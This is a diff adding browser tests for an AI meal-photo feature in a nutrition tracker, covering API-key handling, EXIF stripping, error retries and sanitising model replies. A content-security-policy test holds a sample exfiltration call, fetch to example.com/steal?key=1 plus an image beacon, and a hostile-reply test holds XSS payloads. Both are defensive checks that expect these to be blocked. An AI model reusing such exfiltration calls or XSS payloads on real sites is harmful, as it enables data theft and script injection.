@@ -553,6 +553,371 @@ console.log('\nHostile input');
   await ctx.close();
 }
 
+console.log('\nAI photo logging');
+{
+  // A pretend Anthropic server, so these tests need no real key and cost nothing.
+  const API = 'https://api.anthropic.com/v1/messages';
+  const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
+  const KEY = 'sk-ant-api03-' + 'T'.repeat(40);
+  const KEY_STORAGE = 'recomp-tracker:ai-key';
+  const reply = (obj, extra = {}) => ({ status: 200, body: { id: 'msg_test', type: 'message', role: 'assistant', model: 'claude-opus-5-5', stop_reason: 'end_turn', content: [{ type: 'text', text: typeof obj === 'string' ? obj : JSON.stringify(obj) }], usage: { input_tokens: 1800, output_tokens: 400 }, ...extra } });
+  const MEAL = {
+    is_food: true, meal_name: 'Chicken and rice',
+    items: [
+      { name: 'Grilled chicken breast', grams: 180, protein_g: 54, carbs_g: 0, fat_g: 7, alcohol_g: 0, confidence: 'medium', basis: 'about one large fillet' },
+      { name: 'Steamed jasmine rice', grams: 240, protein_g: 6, carbs_g: 68, fat_g: 1, alcohol_g: 0, confidence: 'high', basis: '1.5 cups cooked' },
+      { name: 'Chilli dipping sauce', grams: 40, protein_g: 0, carbs_g: 10, fat_g: 0, alcohol_g: 0, confidence: 'low', basis: 'small dish' },
+    ],
+    notes: 'Marinade oil is not visible.',
+  };
+  async function mockApi(target, handler) {
+    const calls = [];
+    await target.route(API, async (route) => {
+      const req = route.request();
+      if (req.method() === 'OPTIONS') return route.fulfill({ status: 200, headers: CORS });
+      const call = { url: req.url(), headers: req.headers(), raw: req.postData(), body: JSON.parse(req.postData()) };
+      calls.push(call);
+      const r = await handler(call, calls.length);
+      if (r === 'abort') return route.abort('connectionfailed');
+      return route.fulfill({ status: r.status, headers: { ...CORS, 'content-type': 'application/json' }, body: JSON.stringify(r.body) });
+    });
+    return calls;
+  }
+  const tmp = await mkdtemp(join(tmpdir(), 'rt-photo-'));
+  // A real JPEG, optionally with a fake EXIF block so we can see it get stripped.
+  async function makeJpeg(page, w, h, secret) {
+    const dataUrl = await page.evaluate(({ w, h }) => {
+      const c = document.createElement('canvas');
+      c.width = w;
+      c.height = h;
+      const x = c.getContext('2d');
+      const g = x.createLinearGradient(0, 0, w, h);
+      g.addColorStop(0, '#c0392b');
+      g.addColorStop(1, '#f1c40f');
+      x.fillStyle = g;
+      x.fillRect(0, 0, w, h);
+      x.fillStyle = '#fff';
+      x.beginPath();
+      x.arc(w / 2, h / 2, Math.min(w, h) / 4, 0, 7);
+      x.fill();
+      return c.toDataURL('image/jpeg', 0.92);
+    }, { w, h });
+    let bytes = Buffer.from(dataUrl.split(',')[1], 'base64');
+    if (secret) {
+      const payload = Buffer.concat([Buffer.from('Exif\0\0'), Buffer.from(secret)]);
+      const seg = Buffer.concat([Buffer.from([0xff, 0xe1, (payload.length + 2) >> 8, (payload.length + 2) & 255]), payload]);
+      bytes = Buffer.concat([bytes.subarray(0, 2), seg, bytes.subarray(2)]);
+    }
+    const file = join(tmp, `meal-${w}x${h}.jpg`);
+    await writeFile(file, bytes);
+    return { file, size: bytes.length };
+  }
+  const jpegSize = (buf) => {
+    for (let i = 2; i < buf.length - 9; ) {
+      if (buf[i] !== 0xff) { i++; continue; }
+      const m = buf[i + 1];
+      if (m >= 0xc0 && m <= 0xcf && ![0xc4, 0xc8, 0xcc].includes(m)) return { h: buf.readUInt16BE(i + 5), w: buf.readUInt16BE(i + 7) };
+      i += 2 + buf.readUInt16BE(i + 2);
+    }
+    return null;
+  };
+  const openPhotoTab = async (page, slot = 'dinner') => {
+    // a failed test must not leave a sheet open and wreck the ones after it
+    if (await page.locator('.sheet').count()) await page.click('.sheet-head [data-act="sheet-close"]');
+    await page.waitForFunction(() => !document.querySelector('.sheet'));
+    await page.click(`[data-key="meal-${slot}"] [data-act="add-food"]`);
+    await page.click('[data-act="sheet-tab"][data-v="photo"]');
+  };
+  const closeSheet = async (page) => {
+    await page.click('.sheet-head [data-act="sheet-close"]');
+    await page.waitForFunction(() => !document.querySelector('.sheet'));
+  };
+  const storedKey = (page) => page.evaluate((k) => localStorage.getItem(k), KEY_STORAGE);
+  const lastEntries = async (page) => Object.values((await state(page)).days)[0].entries;
+
+  const { ctx, page } = await newPage();
+  await loadExample(page);
+  const secretNote = 'GPS-LEAK-48.8584N-2.2945E';
+  const big = await makeJpeg(page, 3000, 2000, secretNote);
+
+  await check('Photo tab asks for a key first; wrong-looking keys are refused, a good one is accepted', async () => {
+    await openPhotoTab(page);
+    ok(await page.locator('.sheet').innerText().then((t) => /One-time setup/.test(t) && /platform\.claude\.com/.test(t)), 'setup steps missing');
+    eq(await page.locator('[data-act="ai-key-save"]').isDisabled(), true, 'save is disabled with nothing typed');
+    await page.fill('input[data-field="aiKeyInput"]', 'hello there');
+    await page.click('[data-act="ai-key-save"]');
+    ok(/no spaces/.test(await page.locator('.sheet [role="alert"]').innerText()));
+    eq(await storedKey(page), null);
+    await page.fill('input[data-field="aiKeyInput"]', KEY);
+    await page.click('[data-act="ai-key-save"]');
+    await page.waitForSelector('input[data-change="photo-file"]', { state: 'attached' });
+    eq(await storedKey(page), KEY);
+    eq(await page.locator('input[data-field="aiKeyInput"]').count(), 0, 'key field is gone once saved');
+  });
+
+  await check('the key is stored outside the app data, so it can never be in a backup', async () => {
+    ok(!JSON.stringify(await state(page)).includes('sk-ant'), 'key found in app state');
+    await closeSheet(page);
+    await page.click('[data-act="tab"][data-v="more"]');
+    const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act="backup-export"]')]);
+    const text = await readFile(await dl.path(), 'utf8');
+    ok(JSON.parse(text).app === 'recomp-tracker' && !text.includes('sk-ant'), 'backup contains the key');
+    await page.click('[data-act="tab"][data-v="today"]');
+  });
+
+  await check('a content security policy stops the app sending data anywhere but itself and Anthropic', async () => {
+    await ctx.route('https://example.com/**', (r) => r.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, body: 'ok' }));
+    // would succeed (the route above answers it) unless the browser itself refuses
+    eq(await page.evaluate(() => fetch('https://example.com/steal?key=1').then(() => 'allowed', () => 'blocked')), 'blocked');
+    eq(await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__csp = 1'; document.head.appendChild(s); return window.__csp; }), undefined, 'inline script ran');
+    eq(await page.evaluate(() => { const i = new Image(); i.src = 'https://example.com/pixel.gif'; return new Promise((r) => { i.onload = () => r('loaded'); i.onerror = () => r('blocked'); }); }), 'blocked', 'an image beacon was allowed');
+    page.errors = page.errors.filter((e) => !/Content Security Policy/.test(e)); // those errors are the point of this test
+  });
+
+  let calls;
+  await check('a photo is shrunk, stripped of hidden data, and sent with the right headers', async () => {
+    calls = await mockApi(ctx, () => reply(MEAL));
+    await openPhotoTab(page);
+    await page.setInputFiles('input[data-change="photo-file"]', big.file);
+    await page.waitForSelector('img.photo-preview');
+    await page.fill('input[data-field="photo.note"]', 'no sugar in the tea');
+    await page.click('[data-act="photo-analyze"]');
+    await page.waitForSelector('.photo-item');
+    eq(calls.length, 1);
+    const c = calls[0];
+    eq(c.url, API);
+    eq(c.headers['x-api-key'], KEY);
+    eq(c.headers['anthropic-version'], '2023-06-01');
+    eq(c.headers['anthropic-dangerous-direct-browser-access'], 'true');
+    ok(!c.url.includes(KEY.slice(8)) && !c.raw.includes(KEY.slice(8)), 'key leaked into url or body');
+    eq(c.body.model, 'claude-opus-5-5');
+    ok(!('tool_choice' in c.body) && !('temperature' in c.body), 'sent a parameter the model rejects');
+    eq(c.body.output_config.format.type, 'json_schema');
+    const [img, text] = c.body.messages[0].content;
+    eq(img.source.media_type, 'image/jpeg');
+    const jpg = Buffer.from(img.source.data, 'base64');
+    const dim = jpegSize(jpg);
+    ok(dim && Math.max(dim.w, dim.h) === 1280, `long edge should be 1280, got ${JSON.stringify(dim)}`);
+    ok(Math.abs(dim.w / dim.h - 1.5) < 0.01, 'aspect ratio changed');
+    ok(jpg.length < big.size, 'not smaller than the original');
+    ok((await readFile(big.file)).includes(secretNote), 'test setup: the original photo should carry the hidden marker');
+    ok(!jpg.toString('latin1').includes(secretNote) && !jpg.toString('latin1').includes('Exif'), 'hidden photo data was not stripped');
+    ok(/no sugar in the tea/.test(text.text), 'the note was not sent');
+  });
+
+  await check('results are listed with totals; editing a weight rescales it; an item can be removed', async () => {
+    eq(await page.locator('.photo-item').count(), 3);
+    const sheet = await page.locator('.sheet').innerText();
+    ok(/Chicken and rice/.test(sheet) && /Marinade oil/.test(sheet) && /low confidence/.test(sheet));
+    const total = async () => Number((await page.locator('.sheet .card.flat').first().innerText()).match(/(\d+) kcal/)[1]);
+    eq(await total(), Math.round(54 * 4 + 7 * 9 + 6 * 4 + 68 * 4 + 1 * 9 + 10 * 4)); // 216+63+24+272+9+40 = 624
+    await page.fill('input[aria-label="Weight of Grilled chicken breast"]', '90');
+    eq(await total(), Math.round(624 - (27 * 4 + 3.5 * 9))); // half the chicken: 624 - 139.5 = 484.5
+    await page.fill('input[aria-label="Weight of Grilled chicken breast"]', '');
+    ok(/Enter an amount/.test(await page.locator('.photo-item').first().innerText()), 'empty weight not flagged');
+    ok(await page.locator('[data-act="photo-add"]').isEnabled(), 'other items can still be added');
+    await page.fill('input[aria-label="Weight of Grilled chicken breast"]', '90');
+    await page.click('[data-act="photo-remove"][data-i="2"]');
+    eq(await page.locator('.photo-item').count(), 2);
+  });
+
+  await check('"Add to" logs one flagged estimate per item and the day total moves', async () => {
+    const before = await kcalEaten(page);
+    await page.click('[data-act="photo-add"]');
+    await page.waitForFunction(() => !document.querySelector('.sheet'));
+    const entries = (await lastEntries(page)).filter((e) => e.src === 'ai');
+    eq(entries.length, 2);
+    eq(entries[0].name, 'Grilled chicken breast (~90 g)');
+    eq(entries[1].name, 'Steamed jasmine rice (~240 g)');
+    ok(entries.every((e) => e.est === true && e.foodId === null && e.slot === 'dinner'));
+    eq(entries[0].p, 27);
+    eq(entries[0].f, 3.5);
+    eq(entries[1].c, 68);
+    const gained = Math.round(27 * 4 + 3.5 * 9 + 6 * 4 + 68 * 4 + 9);
+    ok(Math.abs((await kcalEaten(page)) - before - gained) <= 1, `ring moved by ${(await kcalEaten(page)) - before}, expected ${gained}`);
+    ok((await page.locator('[data-key="meal-dinner"] .pill.warn').count()) >= 2, 'estimates are not marked in the log');
+  });
+
+  await check('a failed estimate keeps the photo and can be retried: bad key, busy server, no network, garbled reply', async () => {
+    const script = [{ status: 401, body: { type: 'error', error: { type: 'authentication_error', message: 'API key is invalid.' } } }, { status: 529, body: { type: 'error', error: { type: 'overloaded_error', message: 'Overloaded' } } }, 'abort', reply('this is not json'), reply(MEAL)];
+    let i = 0;
+    await ctx.unroute(API);
+    calls = await mockApi(ctx, () => script[i++]);
+    await openPhotoTab(page);
+    await page.setInputFiles('input[data-change="photo-file"]', big.file);
+    await page.waitForSelector('img.photo-preview');
+    const expectError = async (re) => {
+      await page.click('[data-act="photo-analyze"]');
+      await page.waitForSelector('.sheet .banner.bad');
+      ok(re.test(await page.locator('.sheet .banner.bad').innerText()), `expected ${re}, got: ${await page.locator('.sheet .banner.bad').innerText()}`);
+      ok(await page.locator('img.photo-preview').isVisible(), 'photo was lost after an error');
+    };
+    await expectError(/not accepted/);
+    ok(await page.locator('.sheet [data-act="ai-key-open"]').isVisible(), 'no way to fix the key from the error');
+    await expectError(/busy/);
+    await expectError(/Could not reach/);
+    await expectError(/could not be read/);
+    await page.click('[data-act="photo-analyze"]');
+    await page.waitForSelector('.photo-item');
+    eq(calls.length, 5);
+    await closeSheet(page);
+  });
+
+  await check('Cancel while waiting returns to the photo, and a late answer is ignored', async () => {
+    await ctx.unroute(API);
+    let release;
+    const gate = new Promise((r) => (release = r));
+    calls = await mockApi(ctx, async () => { await gate; return reply(MEAL); });
+    await openPhotoTab(page);
+    await page.setInputFiles('input[data-change="photo-file"]', big.file);
+    await page.waitForSelector('img.photo-preview');
+    await page.click('[data-act="photo-analyze"]');
+    await page.waitForSelector('.spinner');
+    await page.click('[data-act="photo-cancel"]');
+    await page.waitForSelector('[data-act="photo-analyze"]');
+    release();
+    await page.waitForTimeout(300);
+    eq(await page.locator('.photo-item').count(), 0, 'a cancelled answer showed up anyway');
+    await closeSheet(page);
+  });
+
+  await check('closing the sheet mid-request is harmless and nothing is logged', async () => {
+    await ctx.unroute(API);
+    let release;
+    const gate = new Promise((r) => (release = r));
+    const before = (await lastEntries(page)).length;
+    calls = await mockApi(ctx, async () => { await gate; return reply(MEAL); });
+    await openPhotoTab(page);
+    await page.setInputFiles('input[data-change="photo-file"]', big.file);
+    await page.waitForSelector('img.photo-preview');
+    await page.click('[data-act="photo-analyze"]');
+    await page.waitForSelector('.spinner');
+    await closeSheet(page);
+    release();
+    await page.waitForTimeout(300);
+    eq((await lastEntries(page)).length, before);
+    eq(await page.locator('.sheet').count(), 0);
+  });
+
+  await check('a photo with no food, and a refused request, give clear messages', async () => {
+    await ctx.unroute(API);
+    const script = [reply({ is_food: false, meal_name: '', items: [], notes: 'This is a photo of a cat.' }), reply(MEAL, { stop_reason: 'refusal' })];
+    let i = 0;
+    calls = await mockApi(ctx, () => script[i++]);
+    await openPhotoTab(page);
+    await page.setInputFiles('input[data-change="photo-file"]', big.file);
+    await page.waitForSelector('img.photo-preview');
+    await page.click('[data-act="photo-analyze"]');
+    await page.waitForSelector('.sheet .banner.info');
+    ok(/could not find food/.test(await page.locator('.sheet').innerText()));
+    eq(await page.locator('[data-act="photo-add"]').count(), 0);
+    await page.click('[data-act="photo-again"]');
+    await page.click('[data-act="photo-analyze"]');
+    await page.waitForSelector('.sheet .banner.bad');
+    ok(/declined/.test(await page.locator('.sheet .banner.bad').innerText()));
+    await closeSheet(page);
+  });
+
+  await check('a hostile reply is shown as text, capped, and cannot run anything', async () => {
+    await ctx.unroute(API);
+    const evil = { is_food: true, meal_name: '<img src=x onerror="window.__xss=1">', items: [{ name: '<script>window.__xss=2</script>' + 'Z'.repeat(300), grams: 99999999, protein_g: 1e12, carbs_g: -50, fat_g: 'a lot', alcohol_g: 0, confidence: 'certain', basis: '<b onclick="window.__xss=3">x</b>' }], notes: '<svg onload="window.__xss=4">' };
+    calls = await mockApi(ctx, () => reply(evil));
+    await openPhotoTab(page);
+    await page.setInputFiles('input[data-change="photo-file"]', big.file);
+    await page.waitForSelector('img.photo-preview');
+    await page.click('[data-act="photo-analyze"]');
+    await page.waitForSelector('.photo-item');
+    eq(await page.evaluate(() => window.__xss), undefined, 'injected markup ran');
+    eq(await page.locator('.sheet img[onerror], .sheet svg[onload], .sheet script').count(), 0);
+    const total = Number((await page.locator('.sheet .card.flat').first().innerText()).match(/(\d+) kcal/)[1]);
+    ok(total <= 400 * 4 + 1, `absurd numbers were not capped (${total} kcal)`);
+    const wide = await page.evaluate(() => { const b = document.querySelector('.sheet-body'); return b.scrollWidth - b.clientWidth; });
+    ok(wide <= 1, `long text widened the sheet by ${wide}px`);
+    await closeSheet(page);
+  });
+
+  await check('More shows the key masked; switching model changes the next request; Test key works and reports errors', async () => {
+    await ctx.unroute(API);
+    let mode = 'ok';
+    calls = await mockApi(ctx, () => (mode === 'ok' ? reply('OK') : { status: 401, body: { type: 'error', error: { type: 'authentication_error', message: 'API key is invalid.' } } }));
+    await page.click('[data-act="tab"][data-v="more"]');
+    const card = page.locator('section.card:has(h2:text("AI photo logging"))');
+    ok(/Ready/.test(await card.innerText()) && (await card.innerText()).includes('sk-ant-…TTTT') && !(await card.innerText()).includes(KEY), 'key not shown masked');
+    await card.locator('[data-act="ai-model"][data-v="claude-sonnet-5-5"]').click();
+    eq((await state(page)).prefs.aiModel, 'claude-sonnet-5-5');
+    await card.locator('[data-act="ai-key-test"]').click();
+    await card.locator('text=Your key works').waitFor();
+    eq(calls.at(-1).body.model, 'claude-sonnet-5-5');
+    ok(calls.at(-1).raw.length < 600 && !calls.at(-1).raw.includes('"image"'), 'the key test should be a tiny text request');
+    mode = 'bad';
+    await card.locator('[data-act="ai-key-test"]').click();
+    await card.locator('text=not accepted').waitFor();
+    await card.locator('[data-act="ai-model"][data-v="claude-opus-5-5"]').click();
+  });
+
+  await check('removing the key clears it and photo logging asks for setup again', async () => {
+    const card = page.locator('section.card:has(h2:text("AI photo logging"))');
+    await card.locator('[data-act="ai-key-remove"]').click();
+    await page.click('[data-act="confirm-yes"]');
+    await card.locator('text=Not set up').waitFor();
+    eq(await storedKey(page), null);
+    await page.click('[data-act="tab"][data-v="today"]');
+    await openPhotoTab(page);
+    ok(/One-time setup/.test(await page.locator('.sheet').innerText()));
+    await closeSheet(page);
+  });
+
+  await check('"Delete all data" also removes the key', async () => {
+    await page.evaluate((a) => localStorage.setItem(a[0], a[1]), [KEY_STORAGE, KEY]);
+    await page.click('[data-act="tab"][data-v="more"]');
+    await page.click('[data-act="reset-all"]');
+    await page.click('[data-act="confirm-yes"]');
+    await page.waitForSelector('[data-act="try-example"]');
+    eq(await storedKey(page), null);
+  });
+  eq(page.errors.filter((e) => !/Failed to load resource|net::/.test(e)).length, 0, 'console errors: ' + page.errors.join('; '));
+  await ctx.close();
+
+  // The real setup: the service worker is active. It must leave calls to Anthropic alone.
+  const sw = await newPage({ serviceWorkers: 'allow' });
+  await check('with the service worker active, the photo flow still reaches the API (a portrait photo, too)', async () => {
+    const p = sw.page;
+    await p.goto(BASE);
+    await p.evaluate(() => navigator.serviceWorker.ready);
+    await p.reload();
+    await p.waitForFunction(() => !!navigator.serviceWorker.controller);
+    await p.click('[data-act="try-example"]');
+    await p.waitForSelector('.tabbar');
+    await p.evaluate((a) => localStorage.setItem(a[0], a[1]), [KEY_STORAGE, KEY]);
+    const swCalls = await mockApi(sw.ctx, () => reply(MEAL));
+    const portrait = await makeJpeg(p, 1500, 2400);
+    await openPhotoTab(p, 'lunch');
+    await p.setInputFiles('input[data-change="photo-file"]', portrait.file);
+    await p.waitForSelector('img.photo-preview');
+    await p.click('[data-act="photo-analyze"]');
+    await p.waitForSelector('.photo-item');
+    eq(swCalls.length, 1);
+    const dim = jpegSize(Buffer.from(swCalls[0].body.messages[0].content[0].source.data, 'base64'));
+    ok(dim.h === 1280 && Math.abs(dim.w / dim.h - 1500 / 2400) < 0.01, `portrait photo came out ${JSON.stringify(dim)}`);
+    await p.click('[data-act="photo-add"]');
+    await p.waitForFunction(() => !document.querySelector('.sheet'));
+    ok((await state(p)).days[Object.keys((await state(p)).days)[0]].entries.filter((e) => e.slot === 'lunch' && e.src === 'ai').length === 3);
+  });
+  await check('offline: a clear message instead of a hang', async () => {
+    const p = sw.page;
+    await sw.ctx.unroute(API);
+    await sw.ctx.setOffline(true);
+    await openPhotoTab(p, 'dinner');
+    await p.setInputFiles('input[data-change="photo-file"]', big.file);
+    await p.waitForSelector('img.photo-preview');
+    await p.click('[data-act="photo-analyze"]');
+    await p.waitForSelector('.sheet .banner.bad');
+    ok(/Could not reach/.test(await p.locator('.sheet .banner.bad').innerText()));
+    await sw.ctx.setOffline(false);
+  });
+  await sw.ctx.close();
+}
+
 console.log('\nOffline & PWA');
 {
   const { ctx, page } = await newPage({ serviceWorkers: 'allow' });
